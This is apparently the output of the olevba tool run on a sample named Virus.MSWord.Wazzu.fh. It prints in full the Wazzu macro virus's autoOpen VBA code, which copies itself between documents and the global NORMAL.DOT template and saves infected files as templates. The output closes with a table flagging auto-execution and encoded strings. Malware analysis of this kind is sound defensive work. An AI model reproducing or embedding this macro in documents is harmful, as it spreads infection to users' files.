olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Wazzu.fh
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO autoOpen 
in file: ./Virus.MSWord.Wazzu.fh - OLE stream: 'autoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim TheSmallOne$
Dim TheBigOne$
Dim ThisOne$
   
    TheSmallOne$ = WordBasic.[FileName$]() + ":autoOpen"

    TheBigOne$ = "Global:autoOpen"
    ThisOne$ = UCase(WordBasic.[Right$](WordBasic.[MacroFileName$](WordBasic.[MacroName$](0)), 10))

    If ThisOne$ = "NORMAL.DOT" Then
        SmallFileAtt = GetAttr(WordBasic.[FileName$]())
        If SmallFileAtt >= 32 Then SmallFileAtt = SmallFileAtt - 32
        If SmallFileAtt >= 4 Then SmallFileAtt = SmallFileAtt - 4
        If SmallFileAtt >= 2 Then SmallFileAtt = SmallFileAtt - 2
        If SmallFileAtt = 0 Then
        
            WordBasic.MacroCopy TheBigOne$, TheSmallOne$
            WordBasic.FileSaveAs Format:=1
            WordBasic.SetDocumentDirty 0
        End If
    Else
        WordBasic.MacroCopy TheSmallOne$, TheBigOne$
    End If
    
End Sub
-------------------------------------------------------------------------------
VBA MACRO ThisDocument 
in file: ./Virus.MSWord.Wazzu.fh - OLE stream: 'ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

